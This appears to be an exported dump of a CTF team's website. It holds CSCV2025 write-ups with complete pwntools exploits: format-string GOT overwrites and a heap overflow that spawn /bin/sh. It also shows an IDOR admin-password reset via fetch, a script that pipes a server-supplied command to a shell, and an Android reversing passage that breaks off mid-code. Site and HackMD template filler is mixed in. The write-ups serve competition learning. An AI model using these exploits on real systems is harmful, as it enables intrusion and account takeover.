
[{"content":"","date":"23 October 2025","externalUrl":null,"permalink":"/tags/example/","section":"Tags","summary":"","title":"Example","type":"tags"},{"content":"an example to get you started\nThis is a heading\r#\rThis is a subheading\r#\rThis is a subsubheading\r#\rThis is a subsubsubheading\r#\rThis is a paragraph with bold and italic text. Check more at Blowfish documentation undefined\n","date":"23 October 2025","externalUrl":null,"permalink":"/for/1761228735377-for/","section":"Fors","summary":"","title":"FOR","type":"for"},{"content":"","date":"23 October 2025","externalUrl":null,"permalink":"/for/","section":"Fors","summary":"","title":"Fors","type":"for"},{"content":"","date":"23 October 2025","externalUrl":null,"permalink":"/","section":"MSEC","summary":"","title":"MSEC","type":"page"},{"content":"","date":"23 October 2025","externalUrl":null,"permalink":"/tags/tag/","section":"Tags","summary":"","title":"Tag","type":"tags"},{"content":"","date":"23 October 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"\rCSCV2025 - Pwn\r#\rRacehorseS\r#\rSummary\r#\rSources: horse_say.zip\nThe binary contains a format-string vulnerability in printf(s) and Partial RELRO. Use a format-string to overwrite GOT entries. The goal is to get a shell by redirecting strlen() to system() and passing \u0026quot;/bin/sh\u0026quot;.\nExploit\r#\rAllow multiple inputs\r#\rint __fastcall main(int argc, const char **argv, const char **envp) { unsigned __int64 i; // [rsp+10h] [rbp-430h] unsigned __int64 j; // [rsp+18h] [rbp-428h] size_t v6; // [rsp+20h] [rbp-420h] size_t v7; // [rsp+28h] [rbp-418h] char s[1032]; // [rsp+30h] [rbp-410h] BYREF unsigned __int64 v9; // [rsp+438h] [rbp-8h] v9 = __readfsqword(0x28u); setup(argc, argv, envp); memset(s, 0, 0x400u); printf(\u0026#34;Say something: \u0026#34;); if ( fgets(s, 1024, stdin) ) { v6 = strlen(s); if ( v6 \u0026amp;\u0026amp; s[v6 - 1] == 10 ) s[v6 - 1] = 0; v7 = strlen(s); if ( !v7 ) strcpy(s, \u0026#34;(silence)\u0026#34;); putchar(32); for ( i = 0; i \u0026lt; v7 + 2; ++i ) putchar(95); printf(\u0026#34;\\n\u0026lt; \u0026#34;); printf(s); puts(\u0026#34; \u0026gt;\u0026#34;); for ( j = 0; j \u0026lt; v7 + 2; ++j ) putchar(45); putchar(10); puts(\u0026#34; \\\\ ^__^\u0026#34;); puts(\u0026#34; \\\\ (oo)\\\\_______\u0026#34;); puts(\u0026#34; (__)\\\\ )\\\\/\\\\\u0026#34;); puts(\u0026#34; ||-----||\u0026#34;); puts(\u0026#34; || ||\u0026#34;); puts(\u0026amp;byte_402096); exit(0); } return 0; } The program normally exits after one input. Overwrite exit's GOT entry to point to main so the program loops and accepts input repeatedly.\npl = b\u0026#39;%4829c%14$hn\u0026#39; pl = pl.ljust(16, b\u0026#39;A\u0026#39;) pl += p64(0x404048) sla(\u0026#34;something: \u0026#34;, pl) This writes the low 2 bytes to the target GOT address using %hn. After this the program returns to main instead of exiting.\nLeak libc\r#\rLeak an address from the stack to compute libc base. In this run the leak is libc_start_call_main+122 at stack offset 281.\npl2 = b\u0026#39;%281$p\u0026#39; sla(\u0026#34;something: \u0026#34;, pl2) Parse the leaked pointer and subtract the known offset to get libc.base. Then compute system.\nOverwrite strlen GOT with system\r#\rmain() calls fgets() then strlen(). Overwrite the GOT entry for strlen with the address of system. When strlen(s) is called with s = \u0026ldquo;/bin/sh\u0026rdquo;, system(\u0026quot;/bin/sh\u0026quot;) runs.\nif ( fgets(s, 1024, stdin) ) { v6 = strlen(s); pl3 = fmtstr_payload(12, {exe.got.strlen : system}) sla(\u0026#34;something: \u0026#34;, pl3) Before: After: Trigger shell\r#\rSend /bin/sh as the input. The overwritten GOT causes execution of system(\u0026quot;/bin/sh\u0026quot;). Then interact with the shell and read the flag.\n#!/usr/bin/env python3 from pwn import * import subprocess exe = ELF(\u0026#39;horse_say\u0026#39;, checksec=False) libc = ELF(\u0026#39;libc.so.6\u0026#39;, checksec=False) context.binary = exe info = lambda msg: log.info(msg) s = lambda data, proc=None: proc.send(data) if proc else p.send(data) sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data) sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data) sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data) sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode()) sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode()) sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode()) slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode()) r = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n) rl = lambda proc=None: proc.recvline() if proc else p.recvline() ru = lambda delim=b\u0026#39;\\n\u0026#39;, proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim) ra = lambda proc=None: proc.recvall() if proc else p.recvall() def GDB(): gdb.attach(p, gdbscript=\u0026#34;\u0026#34;\u0026#34; b*main+118 b*main+385 b*main+551 \u0026#34;\u0026#34;\u0026#34;) if args.REMOTE: p = remote(\u0026#34;pwn1.cscv.vn\u0026#34;, int(\u0026#34;6789\u0026#34;)) else: p = process([exe.path]) if args.GDB: GDB() # Gud luk pwner ! ru(\u0026#34;work: \u0026#34;) curl_cmd = rl().strip() info(f\u0026#39;curl: {curl_cmd}\u0026#39;) try: sol = subprocess.check_output(curl_cmd.decode(), shell=True, executable=\u0026#34;/bin/sh\u0026#34;, stderr=subprocess.DEVNULL).strip() log.info(f\u0026#34;pow solution: {sol!r}\u0026#34;) sla(b\u0026#34;solution: \u0026#34;, sol) except subprocess.CalledProcessError: log.warning(\u0026#34;Chạy curl|sh thất bại. Bạn có thể chạy thủ công trên máy local:\u0026#34;) log.warning(curl_cmd.decode()) pl = b\u0026#39;%4829c%14$hn\u0026#39; pl = pl.ljust(16, b\u0026#39;A\u0026#39;) pl += p64(0x404048) sla(\u0026#34;something: \u0026#34;, pl) pl2 = b\u0026#39;%281$p\u0026#39; sla(\u0026#34;something: \u0026#34;, pl2) ru(\u0026#39;0x\u0026#39;) leak = r(12) leak_addr = int(b\u0026#39;0x\u0026#39; + leak, 16) info(f\u0026#39;leak addr: {hex(leak_addr)}\u0026#39;) libc.address = leak_addr - 0x2a1ca info(f\u0026#39;libc base: {hex(libc.address)}\u0026#39;) system = libc.symbols[\u0026#39;system\u0026#39;] info(f\u0026#39;system: {hex(system)}\u0026#39;) pl3 = fmtstr_payload(12, {exe.got.strlen : system}) sla(\u0026#34;something: \u0026#34;, pl3) sla(\u0026#34;something: \u0026#34;, b\u0026#39;/bin/sh\\x00\u0026#39;) sl(\u0026#39;cat flag\u0026#39;) p.interactive() Result\r#\rFlag CSCV2025{k1m1_n0_4184_64_2ukyun_d0kyun_h45h1r1d35h1}\nHeap NoteS\r#\rSummary\r#\rSources: heapnote.zip\nVulnerabilities:\nHeap overflow in write_note() via gets() allows overwriting adjacent chunks.\nread_note() does not validate indices, allowing memory leaks.\nGoal: leak libc, overwrite GOT to call system(\u0026quot;/bin/sh\u0026quot;), and retrieve the flag.\nExploit\r#\rint __fastcall __noreturn main(int argc, const char **argv, const char **envp) { int v3; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+8h] [rbp-8h] v4 = __readfsqword(0x28u); setbuf(stdin, 0); setbuf(_bss_start, 0); setbuf(stderr, 0); while ( 1 ) { menu(); __isoc99_scanf(\u0026#34;%d%*c\u0026#34;, \u0026amp;v3); if ( v3 == 4 ) exit(0); if ( v3 \u0026gt; 4 ) { LABEL_12: puts(\u0026#34;Wrong choice\u0026#34;); } else { switch ( v3 ) { case 3: write_note(); break; case 1: create_note(); break; case 2: read_note(); break; default: goto LABEL_12; } } } } int create_note() { __int64 i; // [rsp+0h] [rbp-10h] _QWORD *v2; // [rsp+8h] [rbp-8h] if ( g_note ) { for ( i = g_note; *(_QWORD *)(i + 8); i = *(_QWORD *)(i + 8) ) ; v2 = malloc(0x30u); *(_DWORD *)v2 = *(_DWORD *)i + 1; v2[1] = 0; *(_QWORD *)(i + 8) = v2; return printf(\u0026#34;Note with index %u created\\n\u0026#34;, *(_DWORD *)v2); } else { g_note = (__int64)malloc(0x30u); *(_DWORD *)g_note = 0; *(_QWORD *)(g_note + 8) = 0; return puts(\u0026#34;Note with index 0 created\u0026#34;); } } unsigned __int64 read_note() { int v1; // [rsp+Ch] [rbp-14h] BYREF __int64 i; // [rsp+10h] [rbp-10h] unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); if ( g_note ) { v1 = 0; printf(\u0026#34;Index: \u0026#34;); __isoc99_scanf(\u0026#34;%u%*c\u0026#34;, \u0026amp;v1); for ( i = g_note; *(_DWORD *)i != v1; i = *(_QWORD *)(i + 8) ) { if ( !*(_QWORD *)(i + 8) ) return v3 - __readfsqword(0x28u); } puts((const char *)(i + 16)); } return v3 - __readfsqword(0x28u); } unsigned __int64 write_note() { int v1; // [rsp+Ch] [rbp-14h] BYREF __int64 i; // [rsp+10h] [rbp-10h] unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); if ( g_note ) { v1 = 0; printf(\u0026#34;Index: \u0026#34;); __isoc99_scanf(\u0026#34;%u%*c\u0026#34;, \u0026amp;v1); for ( i = g_note; *(_DWORD *)i != v1; i = *(_QWORD *)(i + 8) ) { if ( !*(_QWORD *)(i + 8) ) return v3 - __readfsqword(0x28u); } gets(i + 16); } return v3 - __readfsqword(0x28u); } Leak libc by overwriting next pointer\r#\rUse the heap overflow to overwrite the next pointer of the next chunk. Set next = 0x404009. Calling read_note(0x4010) will read from 0x404009 + 16 = 0x404019, leaking a libc pointer (printf). From the leak, calculate libc base and system.\npayload = b\u0026#39;\\x00\u0026#39; * 40 payload += p64(0x41) payload += p64(1) payload += p64(0x404008+1) write(0, payload) read(0x4010) Fake next pointer to GOT and overwrite with system\r#\rNext, fake the next pointer to 0x404010. Then gets(i+16) writes into 0x404020, which is the GOT entry for gets. Create a chunk containing /bin/sh:\npayload = b\u0026#39;/bin/sh\\x00\u0026#39; + p64(0)*4 + p64(0x41) + p64(1) + p64(0x404010) write(0, payload) Overwrite the GOT entry with system:\nwrite(libc.sym[\u0026#39;setbuf\u0026#39;] \u0026amp; 0xffffffff, system) Before: After: After this, calling gets() triggers system(\u0026quot;/bin/sh\u0026quot;).\nTrigger shell and read flag\r#\rCall write_note function to execute system(\u0026quot;/bin/sh\u0026quot;). Then read the flag.\n#!/usr/bin/env python3 from pwn import * exe = ELF(\u0026#39;challenge_patched\u0026#39;, checksec=False) libc = ELF(\u0026#39;libc.so.6\u0026#39;, checksec=False) context.binary = exe info = lambda msg: log.info(msg) s = lambda data, proc=None: proc.send(data) if proc else p.send(data) sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data) sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data) sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data) sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode()) sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode()) sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode()) slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode()) r = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n) rl = lambda proc=None: proc.recvline() if proc else p.recvline() ru = lambda delim=b\u0026#39;\\n\u0026#39;, proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim) ra = lambda proc=None: proc.recvall() if proc else p.recvall() def GDB(): gdb.attach(p, gdbscript=\u0026#34;\u0026#34;\u0026#34; b*main+119 \u0026#34;\u0026#34;\u0026#34;) if args.REMOTE: p = remote(\u0026#34;pwn2.cscv.vn\u0026#34;, \u0026#34;3333\u0026#34;) else: p = process([exe.path]) if args.GDB: GDB() # Gud luk pwner ! def create(): sla(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) def read(idx): sla(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;2\u0026#39;) slna(b\u0026#39;Index: \u0026#39;, idx) def write(idx, content): sla(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;3\u0026#39;) slna(b\u0026#39;Index: \u0026#39;, idx) sl(content) create() create() payload = b\u0026#39;\\x00\u0026#39; * 40 payload += p64(0x41) payload += p64(1) payload += p64(0x404008+1) write(0, payload) read(0x4010) leak = rl() printf_leak = (u64(leak.ljust(8,b\u0026#39;\\x00\u0026#39;)) \u0026amp; 0xffffffffff ) \u0026lt;\u0026lt; 8 info(f\u0026#39;printf_leak: {hex(printf_leak)}\u0026#39;) libc.address = printf_leak - libc.sym[\u0026#39;printf\u0026#39;] info(f\u0026#39;libc.address: {hex(libc.address)}\u0026#39;) system = p64(libc.sym[\u0026#39;system\u0026#39;]) info(f\u0026#39;system: {hex(libc.sym[\u0026#34;system\u0026#34;])}\u0026#39;) payload = b\u0026#39;/bin/sh\\x00\u0026#39; + p64(0)*4 + p64(0x41) + p64(1) + p64(0x404010) write(0, payload) write(libc.sym[\u0026#39;setbuf\u0026#39;] \u0026amp; 0xffffffff, system) sla(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;3\u0026#39;) slna(b\u0026#39;Index: \u0026#39;, b\u0026#39;0\u0026#39;) sl(\u0026#39;cat flag.txt\u0026#39;) p.interactive() Result\r#\rFlag CSCV2025{313487590c9dbf64bdd49d7e76980965}\nSudokuS\r#\rSummary\r#\rSources: public.zip\nExploit\r#\rint __fastcall main(int argc, const char **argv, const char **envp) { int choice; // [rsp+8h] [rbp-8h] BYREF int v5; // [rsp+Ch] [rbp-4h] init(argc, argv, envp); init_sec_comp(); puts(\u0026#34;=== CSCV2025 - SudoShell ===\u0026#34;); menu(); printf(\u0026#34;\u0026gt; \u0026#34;); v5 = __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;choice); if ( v5 \u0026lt;= 0 ) { perror(\u0026#34;scanf failed\u0026#34;); exit(1); } switch ( choice ) { case 1: start_game(); break; case 2: exit(0); case 3: help(); break; } return 0; } Ta thấy có RWX Segments, khả năng là ret2shellcode. Ngoài ra chương trình còn có lớp bảo vệ seccomp:\n","externalUrl":null,"permalink":"/pwn/1761226116132-abc/","section":"Pwns","summary":"","title":"CSCV2025 - Pwn","type":"pwn"},{"content":"\rLEAK FORCE\r#\rTEST\r#\rChallenge cung cấp một mã nguồn HTML http://web1.cscv.vn:9981/ Trước tiên em sẽ thử các chức năng của web\nRegister các thứ các thứ rồi login với username: abc2, password: abc\nSau khi login xong thì sẽ được chuyển tới trang http://web1.cscv.vn:9981/profile.html Tại đây em thử các chức năng Save Changes và Update Password thì không có gì đặc biệt\nVới target là IDOR, thì thường admin user có thể là ID 1 (khá phổ biến)\nEm đã thử lệnh curl \u0026lsquo;http://web1.cscv.vn:9981/api/profile?id=1' \\ và kết quả trả về là\n-H \u0026#39;Accept: */*\u0026#39; \\ -H \u0026#39;Accept-Language: en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7\u0026#39; \\ -H \u0026#39;Connection: keep-alive\u0026#39; \\ -H \u0026#39;If-None-Match: W/\u0026#34;e8-LeJvTb4wZSK6PbyPTrZ1iVWdsIM\u0026#34;\u0026#39; \\ -H \u0026#39;Referer: http://web1.cscv.vn:9981/profile.html\u0026#39; \\ -H \u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36\u0026#39; \\ --insecure {\u0026#34;id\u0026#34;:1,\u0026#34;fullName\u0026#34;:\u0026#34;CTF Admin\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;test1234@example.com\u0026#34;,\u0026#34;description\u0026#34;:\u0026#34;New user1\u0026#34;,\u0026#34;avatar\u0026#34;:\u0026#34;/uploads/user_undefined_1760753297965.txt\u0026#34;,\u0026#34;birthdate\u0026#34;:null,\u0026#34;gender\u0026#34;:null,\u0026#34;company\u0026#34;:\u0026#34;abc\u0026#34;} Từ đây em đã chắc chắn ID admin là 1 VỤT\r#\rKhai thác IDOR: dùng chức năng đặt lại mật khẩu để lấy quyển truy cập vào tài khoản admin\nEm vào Devtools -\u0026gt; Network để kiểm tra có những gì\nEm thử check response của profile.js Từ đây em sẽ tận dụng endpoint từ Network để reset password của ID=1 (ID của admin user) và lấy quyển truy cập tới tài khoản Admin\nSử dụng console để gửi fetch thay đổi mật khẩu tới ID=1\n(async function() { const targetId = 1; const newPassword = \u0026#39;msec\u0026#39;; const response = await fetch(\u0026#39;/api/reset-password\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify({ id: targetId, newPassword: newPassword }) }); const result = await response.json(); if (response.ok) { console.log(\u0026#39;Đặt lại mật khẩu thành công cho ID:\u0026#39;, targetId, result); } else { console.error(\u0026#39;Thất bại:\u0026#39;, result); } })(); Response: Sau đó logout rồi login với username=admin, password=msec và nhận được flag ** FLAG: CSCV2025{7h3_Uni73d_N47i0ns_C0nv3n7i0n_4g4ins7_Cyb3rcrim3}**\n","externalUrl":null,"permalink":"/web/1761228033953-xyz/","section":"Webs","summary":"","title":"LEAK FORCE","type":"web"},{"content":"","externalUrl":null,"permalink":"/pwn/","section":"Pwns","summary":"","title":"Pwns","type":"pwn"},{"content":"","externalUrl":null,"permalink":"/re/","section":"Res","summary":"","title":"Res","type":"re"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/web/","section":"Webs","summary":"","title":"Webs","type":"web"},{"content":" title: Welcome to HackMD! tags: [onboarding]\nWelcome to HackMD!\r#\rWelcome to HackMD! 👋 Your trusted tool to take notes, share findings, create road-maps, collaborate virtually, and anything else you need \u0026ndash; all in Markdown. With our Markdown editor, you and your team can edit, share, and discuss your documents in real-time.\nThroughout this tutorial, we\u0026rsquo;ll walk through everything you need to know about the Markdown editor and how you can use HackMD to its fullest.\nLet\u0026rsquo;s get started!\nWhat we\u0026rsquo;ll cover\r#\rWorkspace \u0026amp; sidebar Personal workspace Create a note Start with a template Insert images \u0026amp; gifs Comments Suggest edit Share \u0026amp; set permissions Publishing Further learning Workspace \u0026amp; sidebar\r#\rWhenever you sign into your HackMD account, you\u0026rsquo;ll be greeted by a workspace. Everything you do in HackMD takes place in a workspace. Think of this as your homebase, where you can create new notes, jump back into existing ones, change your settings \u0026ndash; anything you need to stay organized and create with ease.\nWhether just yourself or together as a team, every workspace consists of a sidebar and note list. The note list takes up the bulk of the page. Here is where you\u0026rsquo;ll find all your notes. On the sidebar, you\u0026rsquo;ll find\u0026hellip;\nSidebar\r#\r![image](https://hackmd.io/_uploads/S126WKlo0.png =300x)\nToggle to switch between personal and team workspaces. Keyword search bar. \u0026ldquo;New note\u0026rdquo; button. Trash (notes permanently delete after 3 days in the trash). List of tags (these help you filter your notes). List of all bookmarked notes. List of recently viewed notes. [!Tip] Personal vs team sidebar Your team workspace sidebar may look a little different, depending on your permissions within that specific workspace.\nPersonal workspace\r#\rYour personal workspace is your domain. A place where you can record daily activities, write study notes, brainstorm \u0026ndash; anything you\u0026rsquo;d like! This is your space. Only you have access.\nYour personal workspace is also where you can manage your account.\nAccount management\r#\rEvery personal workspace has\u0026hellip;\n![image](https://hackmd.io/_uploads/SycrjDw-yx.png =300x)\nAccount settings. Personal profile page (this is your public page). A list of all the teams you\u0026rsquo;ve joined. Billing settings. A space to\u0026hellip; Change your language preference. Contact the HackMD team. View the Terms of Use. Create a note\r#\rCreating your first note takes only a few seconds.\nClick the \u0026ldquo;New note\u0026rdquo; button at the top of the sidebar to create a note. Once your note opens, you can give it a title, create a document tag, and begin jotting down ideas. ![image](https://hackmd.io/_uploads/Hkz8jJbK0.png =300x)\n[!Tip] Document tags help you organize your work. Organize your documents into groups, keeping your workspace organized and docs easy to find.\nEager to start customizing your note? Like other editing platforms, you can click the toolbar buttons to apply text effects. Bold, italics, bullet points, and tables can all be used with a single click.\n![image](https://hackmd.io/_uploads/SJF1uvPZye.png =550x)\nAnd if you\u0026rsquo;re searching for a specific Markdown function, click on the ? to view a Markdown syntax cheat sheet. ![image](https://hackmd.io/_uploads/r1zruPD-Jx.png =300x)\nWe value your feedback!\r#\rDid you find this guide helpful? Answer one question in this survey and let us know.\nStart with a template\r#\rTo help you get started with HackMD, we\u0026rsquo;ve created a host of templates you can use as a jumping-off point for your notes.\nTo get started, click and then \u0026ldquo;New note from template.\u0026rdquo; From there, you can view our full list of templates. These cover a number of different purposes, which you can use as a starting point or for inspiration. Once you decide on the template, click \u0026ldquo;Use this template\u0026rdquo; to open it as a note. ![image](https://hackmd.io/_uploads/rJ8mYiWaC.png =300x) Here are a few of our favorite templates:\n📑 Project README 🛠️ Product Brief 🖋️ Meeting Minutes 🎨 Design specs Insert images \u0026amp; gifs\r#\rYou can enrich your notes by inserting project images, offline event photos, or demonstration GIFs.\nThere are two main ways to upload images:\nChoose the image you want to insert by clicking 🖼️ in the toolbar. Drag and drop the file into the note editor. ![image](https://hackmd.io/_uploads/HJxGFDvZJg.png =400x) We support the following formats for images and gifs: PNG, JPG, GIF, BMP, and TIF.\nYou can add attributes after the image link to specify the image size (i.e. =300x or =50%).\nImage: GIFs: Comments\r#\rCommenting is the easiest way to give or receive feedback directly in your notes.\nThere are two main ways to leave a comment:\nSelect a piece of text in any note. Click the comment panel. ![image](https://hackmd.io/_uploads/SJRxyCQFR.png =300x) Along with leaving comments about the overall note, the comment panel allows you to view and interact with all the note comments. You can even tag another teammate in a comment by @-mentioning them.\nWant to delete or resolve a comment? Click the three dots on the upper right-hand side to expand the menu. From there, click your desired action.\n![image](https://hackmd.io/_uploads/HJGKTztvR.png =300x)\nYou can always re-open resolved comments by clicking on the comment panel 💬 at the top of the page and then the \u0026ldquo;Marked as Resolved\u0026rdquo; button. From there, click the three dots next to the comment you\u0026rsquo;d like to re-open and \u0026ldquo;Revert resolved\u0026rdquo;.\nWe value your feedback!\r#\rDid you find this guide helpful? Answer one question in this survey and let us know.\nSuggest edit\r#\rSuggest Edit allows you to suggest edits to content you\u0026rsquo;re working with others on \u0026ndash; correct typos, suggest better wording, or even create a to-do list.\nFirst, you\u0026rsquo;ll want to make sure this feature is turned on within your note. To do that, simply\u0026hellip;\nOpen the \u0026ldquo;Share\u0026rdquo; menu in the upper right-hand corner. ![image](https://hackmd.io/_uploads/B1uSCa7tC.png =300x) Click \u0026ldquo;More features\u0026rdquo; to confirm the comment setting and suggest edits are ==\u0026ldquo;on.\u0026quot;== ![image](https://hackmd.io/_uploads/BJdwRpXYR.png =300x) This is also the area to confirm who is allowed to comment and make edits to your note. From there suggesting edits is fairly straightforward. Like creating a comment, to suggest an edit select a piece of text within your note and then click \u0026ldquo;Suggest edit\u0026rdquo;.\nWhere to find the suggestions?\r#\rAll the suggested edits will live in the edit panel. To find that, click the 💬 at the top right of the note. From there, click \u0026ldquo;Comments\u0026rdquo; to activate the drop-down bar.\nThis will show you all the current suggestions, as well as any previously addressed suggestions.\n![image](https://hackmd.io/_uploads/SkhEZdwbkx.png =300x)\nShare \u0026amp; set permissions\r#\rHackMD is built for real-time collaboration, so there are many ways to share your work with others.\nPermissioning with the notes ensures that your collaborators access your content exactly the way you want them to.\nShare button\r#\rClick the \u0026ldquo;Share\u0026rdquo; button at the top right-hand corner of your note. Here you can:\nInvite someone to your note. See and change who has access to the note, and what level of permissions they have. Edit the note\u0026rsquo;s permalink. Copy the note\u0026rsquo;s link to share it with others. Publish your note. (We\u0026rsquo;ll discuss this one later.) ![image](https://hackmd.io/_uploads/Sy42iZm30.png =150x) Link / Permalink\r#\rAt the top of the Share menu is the note\u0026rsquo;s URL or link.\nHere\u0026rsquo;s where you can edit that link, as well as copy it for easy sharing.\nNote Permission\r#\rOnce that\u0026rsquo;s set, underneath you\u0026rsquo;ll find the \u0026ldquo;Note Permission\u0026rdquo; section. That can be set for those who will be reading your note and those writing in it.\n![image](https://hackmd.io/_uploads/r1ptpZXh0.png =300x)\n[!Caution] Once the reading permission is set to \u0026ldquo;Everyone,\u0026rdquo; there are no restrictions on individuals or team members. No matter who gets the link, anyone can read it.\nInvitee\r#\rAt the bottom of the \u0026ldquo;Share\u0026rdquo; menu, you\u0026rsquo;ll find the Invitee section. This is where you can invite individual HackMD users to your note \u0026ndash; invitees need a HackMD account to be invited to your note.\n![image](https://hackmd.io/_uploads/S1PKi-m2C.png =300x)\nPublishing\r#\rPublishing your HackMD notes takes just a second.\nOpen the \u0026ldquo;Share\u0026rdquo; menu Switch to the \u0026ldquo;Publish\u0026rdquo; tab. Ensure compliance with and agree to the HackMD Community Guidelines And publish! ![image](https://hackmd.io/_uploads/SJCG7iZpR.png =300x) Further learning\r#\rWant to learn more ways you can use HackMD? Check out the Expert and Markdown guides in your workspace.\nThe Expert Guide covers:\nTeam Workspaces Sync with GitHub API Calls Book Mode Custom Templates Embed Notes LaTeX \u0026amp; MathJax UML diagrams The Markdown Guide covers:\nMarkdown syntax Text styles Tables Table of contents Edit vs View pages Before you go, HackMD has an official user manual with instructions for all its features!\nIn our tutorial book, you\u0026rsquo;ll find detailed guides to all the main features of HackMD that boost your productivity.\n\u0026#x1f449; HackMD Tutorial Book \u0026#x1f448;\r#\rDon\u0026rsquo;t want to miss the latest news and feature updates from HackMD? Be sure to follow our social channels or join us on Discord.\n\u0026#x1f4eb; support@hackmd.io X (Twitter) Facebook LinkedIn Discord We value your feedback!\r#\rDid you find this guide helpful? Answer one question in this survey and let us know.\n","externalUrl":null,"permalink":"/web/1761227510853-abc/","section":"Webs","summary":"","title":"Welcome to HackMD!","type":"web"},{"content":"Hello everyone🫡! Today I will write a little bit about The Reverse Master challenge in CSCV2025. The question: When we install the file we will have an apk file like this: Use jadx-gui to decompile this file,then open Source code/com/ctf.challenge and you will see Main Activity like this: Open that and you will see the code below:\npackage com.ctf.challenge; import android.graphics.Color; import android.os.Bundle; import android.util.Log; import android.view.View; import android.view.ViewGroup; import android.widget.Button; import android.widget.LinearLayout; import android.widget.TextView; import androidx.appcompat.app.AppCompatActivity; import com.google.android.material.textfield.TextInputEditText; import com.google.android.material.textfield.TextInputLayout; import java.io.BufferedReader; import java.io.File; import java.io.IOException; import java.io.InputStreamReader; import java.net.InetSocketAddress; import java.net.Socket; import o.CountDownTimerC0176z3; import o.F2; import o.F3; import o.RunnableC0154w; import o.V4; /* loaded from: classes.dex */ public final class MainActivity extends AppCompatActivity { public static final /* synthetic */ int b = 0; public final byte[] a = {66, 51, 122, 33, 86}; static { try { System.loadLibrary(\u0026#34;native-lib\u0026#34;); } catch (UnsatisfiedLinkError e) { Log.e(\u0026#34;CTF\u0026#34;, \u0026#34;❌ Native lib failed: \u0026#34; + e.getMessage()); } } public final native boolean checkSecondHalf(String str); public final native String getHint(); public final void h(LinearLayout linearLayout, String str, String str2) { View viewInflate = getLayoutInflater().inflate(android.R.layout.simple_list_item_2, (ViewGroup) linearLayout, false); TextView textView = (TextView) viewInflate.findViewById(android.R.id.text1); TextView textView2 = (TextView) viewInflate.findViewById(android.R.id.text2); textView.setText(\u0026#34;⚠️ \u0026#34;.concat(str)); textView.setTextColor(Color.parseColor(\u0026#34;#FF5252\u0026#34;)); textView.setTextSize(16.0f); textView.setTypeface(null, 1); textView2.setText(str2); textView2.setTextColor(Color.parseColor(\u0026#34;#BDBDBD\u0026#34;)); textView2.setTextSize(13.0f); linearLayout.addView(viewInflate); } @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity public final void onCreate(Bundle bundle) throws IOException { boolean z; String line; super.onCreate(bundle); setContentView(R.layout.activity_main); boolean z2 = false; boolean z3 = (getApplicationInfo().flags \u0026amp; 2) != 0; String[] strArr = {\u0026#34;/system/app/Superuser.apk\u0026#34;, \u0026#34;/sbin/su\u0026#34;, \u0026#34;/system/bin/su\u0026#34;, \u0026#34;/system/xbin/su\u0026#34;, \u0026#34;/data/local/xbin/su\u0026#34;, \u0026#34;/data/local/bin/su\u0026#34;, \u0026#34;/system/sd/xbin/su\u0026#34;, \u0026#34;/system/bin/failsafe/su\u0026#34;, \u0026#34;/data/local/su\u0026#34;}; int i = 0; while (true) { if (i \u0026gt;= 9) { try { Runtime.getRuntime().exec(\u0026#34;su\u0026#34;); break; } catch (Exception unused) { z = false; } } else if (new File(strArr[i]).exists()) { break; } else { i++; } } z = true; try { BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\u0026#34;ps\u0026#34;).getInputStream())); do { line = bufferedReader.readLine(); if (line == null) { break; } else if (!V4.u(line, \u0026#34;frida\u0026#34;) \u0026amp;\u0026amp; !V4.u(line, \u0026#34;gum-js-loop\u0026#34;)) { } } while (!V4.u(line, \u0026#34;gmain\u0026#34;)); z2 = true; bufferedReader.close(); } catch (Exception unused2) { } int i2 = 27042; while (true) { if (i2 \u0026gt;= 27053) { break; } try { Socket socket = new Socket(); socket.connect(new 